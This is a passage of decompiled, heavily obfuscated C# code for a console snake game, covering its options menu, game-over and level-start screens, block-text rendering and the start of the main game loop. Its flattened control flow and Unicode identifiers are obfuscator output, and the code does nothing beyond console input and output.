          string.Format("({0}) [E]xpert Mode", (!\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.expertMode ? 0 : 1) != 0 ? (object) "√" : (object) "·").PadRight(30),
          "    [ESC] to exit game".PadRight(30)
        };
        if ((Operators.CompareString(Conversions.ToString(strArray[0][num5]), "─", false) != 0 ? 1 : 0) == 0)
          strArray[0] = strArray[0].Substring(0, num5) + "∙" + strArray[0].Substring(checked (num5 + 1));
label_23:
        int num7 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(62);
        int num8;
        bool flag;
        while (true)
        {
          switch ((num7 ^ 55) + 62)
          {
            case 0:
              flag = num8 == checked (strArray[0].Length - 1);
              // ISSUE: reference to a compiler-generated method
              num7 = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA90.\uE152\uE14D\uE4B1\uE4CF\uEFA5\uEAA8\uF7D2\uF85C\uF37D\uF074\uF5CA\uE496(19);
              continue;
            case 1:
              if (flag)
              {
                num7 = -15;
                continue;
              }
              goto label_30;
            case 2:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle4 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED94);
              num7 = -13;
              continue;
            case 3:
              num8 = num5;
              num7 = -11;
              continue;
            case 4:
              goto label_29;
            default:
              goto label_23;
          }
        }
label_29:
        int num9 = 0;
        goto label_31;
label_30:
        num9 = 1;
label_31:
        if (num9 == 0)
        {
          num6 = -1;
          if (num6 != 0)
            goto label_35;
        }
        flag = num8 == 0;
        if ((!flag ? 1 : 0) == 0)
          num6 = 1;
label_35:
        checked { num5 += num6; }
        if ((!Console.KeyAvailable ? 1 : 0) == 0)
        {
          switch (Console.ReadKey(true).Key)
          {
            case ConsoleKey.Enter:
              goto label_42;
            case ConsoleKey.Escape:
              \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8F();
              break;
            case ConsoleKey.E:
              \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.expertMode = !\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.expertMode;
              break;
            case ConsoleKey.Y:
              \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.youAreWhatYouEat = !\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.youAreWhatYouEat;
              break;
          }
        }
        Thread.Sleep(30);
      }
label_42:
      Console.Clear();
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8F()
    {
label_7:
      int num1 = (int) sbyte.MaxValue;
      int num2 = -16;
      while (true)
      {
        switch ((num2 ^ 61) + 54)
        {
          case 0:
            switch (num1)
            {
              case 62:
                num1 = 124;
                goto label_1;
              case 63:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED93);
                num1 = 10;
                goto label_1;
              case 64:
                Environment.Exit(0);
                num1 = 116;
                goto label_1;
              case 65:
                num1 = 126;
                goto label_1;
              case 66:
                Console.CursorVisible = true;
                num1 = 115;
                goto label_1;
              case 67:
                num1 = 119;
                goto label_1;
              case 68:
                Console.Clear();
                num1 = 11;
                goto label_1;
              case 69:
                num1 = 114;
                goto label_1;
              case 70:
                num1 = 117;
                goto label_1;
              case 71:
                Console.BackgroundColor = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.originalBackColor;
                num1 = 118;
                goto label_1;
              case 72:
                num1 = 113;
                goto label_1;
              case 73:
                Console.ForegroundColor = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.originalForeColor;
                num1 = 112;
                goto label_1;
              case 74:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED89();
                num1 = 125;
                goto label_1;
              case 75:
                goto label_18;
              default:
                num2 = -15;
                continue;
            }
          case 1:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9E);
            num2 = -10;
            continue;
          case 2:
            goto label_7;
          case 3:
label_1:
            num1 ^= 53;
            break;
        }
        num2 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(53);
      }
label_18:;
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED90(
      object _param0)
    {
label_7:
      int num1 = FoodItem.\uE607\uE6C8\uF041\uE1D1\uEB67\uF562\uF59C\uEDEA\uEABB\uE409\uF42B\uF64E(13);
      int num2 = -15;
      while (true)
      {
        switch ((num2 ^ 60) + 54)
        {
          case 0:
            switch (num1 + 58)
            {
              case 0:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED93);
                num1 = -8;
                goto label_1;
              case 1:
                Console.ForegroundColor = ConsoleColor.Gray;
                num1 = -9;
                goto label_1;
              case 2:
                int[][] numArray = new int[5][]
                {
                  new int[3]{ 0, 3, 15 },
                  new int[3]{ 6, 7, 14 },
                  new int[3]{ 16, 14, 3 },
                  new int[3]{ 30, 4, 7 },
                  new int[3]{ 36, 99, 8 }
                };
                num1 = -11;
                goto label_1;
              case 3:
                num1 = FormLoader.\uF6D9\uF827\uF028\uED0F\uECCA\uE547\uF4C8\uF468\uEA41\uE615\uE78E\uE0F5(44);
                goto label_1;
              case 4:
                num1 = -14;
                goto label_1;
              case 5:
                Console.BackgroundColor = ConsoleColor.Black;
                num1 = -12;
                goto label_1;
              case 6:
                goto label_11;
              default:
                num2 = -16;
                continue;
            }
          case 1:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED91);
            num2 = -9;
            continue;
          case 2:
            goto label_7;
          case 3:
label_1:
            num1 ^= 62;
            break;
        }
        num2 = FormLoader.\uF6D9\uF827\uF028\uED0F\uECCA\uE547\uF4C8\uF468\uEA41\uE615\uE78E\uE0F5(44);
      }
label_11:;
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED91()
    {
      string str = "GAME OVER";
      object Instance = (object) \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED94(str, ConsoleColor.White, ConsoleColor.Red, true, true);
      object obj = Instance;
      \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED92((obj == null ? 0 : 1) != 0 ? (Size) obj : new Size(), Conversions.ToInteger(Operators.SubtractObject(Operators.DivideObject(Operators.SubtractObject((object) Console.WindowHeight, NewLateBinding.LateGet(Instance, (Type) null, "Height", new object[0], (string[]) null, (Type[]) null, (bool[]) null)), (object) 2), (object) 3)), ConsoleColor.Red);
label_5:
      int num1 = 119;
      int num2 = 124;
      while (true)
      {
        switch (num2 ^ 60)
        {
          case 61:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA0);
            num2 = 1;
            continue;
          case 62:
            goto label_5;
          case 63:
            ConsoleKeyInfo consoleKeyInfo;
            bool flag;
            switch (num1)
            {
              case 60:
                flag = consoleKeyInfo.Key == ConsoleKey.Escape;
                num1 = 114;
                goto label_1;
              case 61:
                consoleKeyInfo = Console.ReadKey(true);
                num1 = 10;
                goto label_1;
              case 62:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED94);
                num1 = 8;
                goto label_1;
              case 63:
                Console.WriteLine(str);
                num1 = 116;
                goto label_1;
              case 64:
                str = "Press any key to restart";
                num1 = 115;
                goto label_1;
              case 65:
                num1 = 118;
                goto label_1;
              case 66:
                num1 = 11;
                goto label_1;
              case 67:
                num1 = 9;
                goto label_1;
              case 68:
                if (flag)
                {
                  num1 = 112;
                  goto label_1;
                }
                else
                  goto label_20;
              case 69:
                Console.SetCursorPosition(checked ((int) Math.Round(unchecked ((double) checked (Console.WindowWidth - str.Length) / 2.0))), Conversions.ToInteger(Operators.AddObject(Operators.AddObject(Operators.DivideObject(Operators.SubtractObject((object) Console.WindowHeight, NewLateBinding.LateGet(Instance, (Type) null, "Height", new object[0], (string[]) null, (Type[]) null, (bool[]) null)), (object) 2), NewLateBinding.LateGet(Instance, (Type) null, "Height", new object[0], (string[]) null, (Type[]) null, (bool[]) null)), (object) 4)));
                num1 = 117;
                goto label_1;
              case 70:
                goto label_19;
              default:
                num2 = 2;
                continue;
            }
          case 64:
label_1:
            num1 ^= 54;
            break;
        }
        num2 = 3;
      }
label_19:
      int num3 = 0;
      goto label_21;
label_20:
      num3 = 1;
label_21:
      if (num3 == 0)
        \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8F();
      Console.Clear();
      \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9D();
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED92(
      Size _param0,
      int _param1,
      ConsoleColor _param2)
    {
label_2:
      int num1 = FoodItem.\uE607\uE6C8\uF041\uE1D1\uEB67\uF562\uF59C\uEDEA\uEABB\uE409\uF42B\uF64E(34);
      bool flag;
      string Left;
      while (true)
      {
        switch ((num1 ^ 59) + 58)
        {
          case 0:
            if (flag)
            {
              num1 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(45);
              continue;
            }
            goto label_9;
          case 1:
            Left = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA93.\uE1ED\uF2ED\uF467\uEA54\uE05D\uE495\uE809\uF610\uE29B\uF471\uE6C8\uF15B(\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.reason, \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.rnd);
            num1 = -14;
            continue;
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8A);
            num1 = -13;
            continue;
          case 3:
            flag = Operators.CompareString(Left, "", false) != 0;
            num1 = -3;
            continue;
          case 4:
            goto label_8;
          default:
            goto label_2;
        }
      }
label_8:
      int num2 = 0;
      goto label_10;
label_9:
      num2 = 1;
label_10:
      if (num2 != 0)
        return;
      Console.ForegroundColor = _param2;
label_13:
      int num3 = 106;
      while (true)
      {
        switch (num3 ^ 58)
        {
          case 61:
            num3 = 117;
            continue;
          case 62:
            num3 = 122;
            continue;
          case 63:
            Console.Write(Left);
            num3 = 124;
            continue;
          case 64:
            Console.SetCursorPosition(checked ((int) Math.Round(unchecked ((double) checked (Console.WindowWidth - Left.Length) / 2.0))), checked (_param0.Height + 3 + _param1));
            num3 = 118;
            continue;
          case 65:
            num3 = 126;
            continue;
          case 66:
            num3 = 115;
            continue;
          case 67:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8C);
            num3 = 121;
            continue;
          case 68:
            Console.Write("│" + "│".PadLeft(_param0.Width));
            num3 = (int) sbyte.MaxValue;
            continue;
          case 69:
            num3 = 119;
            continue;
          case 70:
            num3 = 107;
            continue;
          case 71:
            num3 = 112;
            continue;
          case 72:
            Console.SetCursorPosition(checked ((int) Math.Round(unchecked ((double) checked (Console.WindowWidth - _param0.Width) / 2.0))), checked (_param0.Height + 2 + _param1));
            num3 = 125;
            continue;
          case 73:
            Console.Write("└" + Strings.StrDup(checked (_param0.Width - 1), "─") + "┘");
            num3 = 7;
            continue;
          case 74:
            Console.Write("│" + "│".PadLeft(_param0.Width));
            num3 = 113;
            continue;
          case 75:
            num3 = 116;
            continue;
          case 76:
            num3 = 5;
            continue;
          case 77:
            Console.SetCursorPosition(checked ((int) Math.Round(unchecked ((double) checked (Console.WindowWidth - _param0.Width) / 2.0))), checked (_param0.Height + 4 + _param1));
            num3 = 120;
            continue;
          case 78:
            Console.SetCursorPosition(checked ((int) Math.Round(unchecked ((double) checked (Console.WindowWidth - _param0.Width) / 2.0))), checked (_param0.Height + 3 + _param1));
            num3 = 123;
            continue;
          case 79:
            Console.ForegroundColor = ConsoleColor.White;
            num3 = 4;
            continue;
          case 80:
            num3 = 114;
            continue;
          case 81:
            goto label_35;
          default:
            goto label_13;
        }
      }
label_35:;
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED93()
    {
label_2:
      int num1 = 116;
      Size size1;
      string name;
      string str;
      Size size2;
      while (true)
      {
        switch (num1 ^ 53)
        {
          case 61:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED92(size1, 0, ConsoleColor.Blue);
            num1 = 117;
            continue;
          case 62:
            Thread.Sleep(500);
            num1 = 125;
            continue;
          case 63:
            size1 = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED94(name, ConsoleColor.White, ConsoleColor.Blue, true, false, \uE0C0: 2);
            num1 = 8;
            continue;
          case 64:
            num1 = 114;
            continue;
          case 65:
            name = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.currentLevel.Name;
            num1 = 112;
            continue;
          case 66:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED94(str, ConsoleColor.White, ConsoleColor.DarkGreen, true, false, \uE0C0: checked (Console.WindowHeight - size2.Height + 1), \uE0C2: 6, \uE0C3: 0.7);
            num1 = 113;
            continue;
          case 67:
            num1 = 124;
            continue;
          case 68:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA2();
            num1 = 118;
            continue;
          case 69:
            str = string.Format("LEVEL: {0}", (object) \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.currentLevel.Index);
            num1 = 11;
            continue;
          case 70:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8D);
            num1 = 115;
            continue;
          case 71:
            size2 = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.tr.MeassureText(str);
            num1 = 119;
            continue;
          case 72:
            num1 = 10;
            continue;
          case 73:
            goto label_15;
          default:
            goto label_2;
        }
      }
label_15:
      int num2 = 1;
label_16:
      int num3 = checked (4 - num2);
label_18:
      int num4 = 0;
      while (true)
      {
        switch (num4 ^ 61)
        {
          case 57:
            checked { ++num2; }
            num4 = 124;
            continue;
          case 58:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED98);
            num4 = 7;
            continue;
          case 59:
            Thread.Sleep(1000);
            num4 = 126;
            continue;
          case 60:
            num4 = 2;
            continue;
          case 61:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED94(num3.ToString(), ConsoleColor.Red, ConsoleColor.Black, true, true, \uE0C0: 1, \uE0C2: 7);
            num4 = 6;
            continue;
          case 62:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.reason = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E0.None;
            num4 = (int) sbyte.MaxValue;
            continue;
          case 63:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9C();
            num4 = 125;
            continue;
          case 64:
            num4 = 120;
            continue;
          case 65:
            if (num2 > 3)
            {
              num4 = 3;
              continue;
            }
            goto label_16;
          case 66:
            Console.Clear();
            num4 = 121;
            continue;
          case 67:
            num4 = 4;
            continue;
          case 68:
            num4 = 117;
            continue;
          case 69:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA3();
            num4 = 123;
            continue;
          case 70:
            num4 = 119;
            continue;
          case 71:
            num4 = 116;
            continue;
          case 72:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9D();
            num4 = 122;
            continue;
          case 73:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA1(true);
            num4 = 1;
            continue;
          case 74:
            goto label_28;
          default:
            goto label_18;
        }
      }
label_28:;
    }

    private static Size \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED94(
      string _param0,
      ConsoleColor _param1,
      ConsoleColor _param2,
      bool _param3,
      bool _param4,
      int _param5 = 0,
      int _param6 = 0,
      string _param7 = "",
      int _param8 = 8,
      double _param9 = 0.6,
      bool _param10 = true)
    {
      if ((Operators.CompareString(_param7, "", false) != 0 ? 1 : 0) == 0)
        _param7 = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.defaultFont;
      Size size = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.tr.MeassureText(_param0, _param7, (float) _param8, _param9);
      _param5 = (!_param3 ? 0 : 1) != 0 ? checked (unchecked (checked (Console.WindowWidth - size.Width) / 2) + _param5) : _param5;
      _param6 = (!_param4 ? 0 : 1) != 0 ? checked (unchecked (checked (Console.WindowHeight - size.Height) / 2) + _param6) : _param6;
      \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.suspendRenderer = true;
      Console.BackgroundColor = _param2;
      IEnumerator enumerator;
      try
      {
        object obj;
        if ((!_param10 ? 0 : 1) == 0)
        {
          obj = (object) "█";
        }
        else
        {
          obj = (object) new string[5];
          obj[0] = (object) "░";
          obj[1] = (object) "░";
          obj[2] = (object) "▒";
          obj[3] = (object) "▓";
          obj[4] = (object) "█";
        }
        enumerator = ((IEnumerable) obj).GetEnumerator();
label_27:
        while ((!enumerator.MoveNext() ? 0 : 1) != 0)
        {
          char ch = Conversions.ToChar(enumerator.Current);
          int num1 = _param6;
          int num2 = checked (_param6 + size.Height - 1);
          int top = num1;
          while (top <= num2)
          {
            Console.SetCursorPosition(_param5, top);
label_10:
            int num3 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(62);
            int num4;
            int num5;
            int num6;
            while (true)
            {
              switch ((num3 ^ 57) + 57)
              {
                case 0:
                  num5 = num4;
                  num3 = -11;
                  continue;
                case 1:
                  num6 = checked (_param5 + unchecked (size.Width / 2));
                  num3 = FoodItem.\uE607\uE6C8\uF041\uE1D1\uEB67\uF562\uF59C\uEDEA\uEABB\uE409\uF42B\uF64E(24);
                  continue;
                case 2:
                  num4 = checked (_param5 - unchecked (size.Width / 2));
                  num3 = -15;
                  continue;
                case 3:
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9E);
                  num3 = -13;
                  continue;
                case 4:
                  num3 = -16;
                  continue;
                case 5:
                  goto label_17;
                default:
                  goto label_10;
              }
            }
label_17:
            while (num5 <= num6)
            {
              Console.Write(" ");
              checked { ++num5; }
            }
            checked { ++top; }
          }
          \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.tr.Write(_param0, _param5, _param6, _param1, _param7, (float) _param8, Conversions.ToString(ch), _param9);
label_22:
          int num7 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(45);
          while (true)
          {
            switch ((num7 ^ 54) + 59)
            {
              case 0:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9C);
                num7 = -13;
                continue;
              case 1:
                Thread.Sleep(1);
                num7 = -2;
                continue;
              case 2:
                num7 = -16;
                continue;
              case 3:
                num7 = -1;
                continue;
              case 4:
                goto label_27;
              default:
                goto label_22;
            }
          }
        }
      }
      finally
      {
        if ((!(enumerator is IDisposable) ? 1 : 0) == 0)
          (enumerator as IDisposable).Dispose();
      }
      Console.ForegroundColor = ConsoleColor.White;
      Console.BackgroundColor = ConsoleColor.Black;
      return size;
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED95()
    {
      int millisecondsTimeout = 10;
      int num1 = 0;
      int maxValue = 3000;
      int num2 = 0;
      int num3 = 30;
      int num4 = 0;
      while (true)
      {
        do
        {
          \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA3();
          \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8B();
          do
          {
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED93();
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8C();
            while (true)
            {
              do
              {
                int num5 = checked ((int) Math.Round(unchecked ((double) checked (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.currentLevel.MoveDelay - unchecked (!\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.expertMode ? 0 : 1 != 0) ? 10 : 0) - (double) \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake.Count / 4.0)));
label_5:
                int num6 = 9;
                bool flag;
                while (true)
                {
                  switch (num6 ^ 55)
                  {
                    case 56:
                      if (flag)
                      {
                        num6 = 118;
                        continue;
                      }
                      goto label_17;
                    case 57:
                      checked { num4 += millisecondsTimeout; }
                      num6 = 8;
                      continue;
                    case 58:
                      checked { num2 += millisecondsTimeout; }
                      num6 = 12;
                      continue;
                    case 59:
                      flag = num4 >= num3;
                      num6 = 15;
                      continue;
                    case 60:
                      // ISSUE: method reference
                      RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED99);
                      num6 = 11;
                      continue;
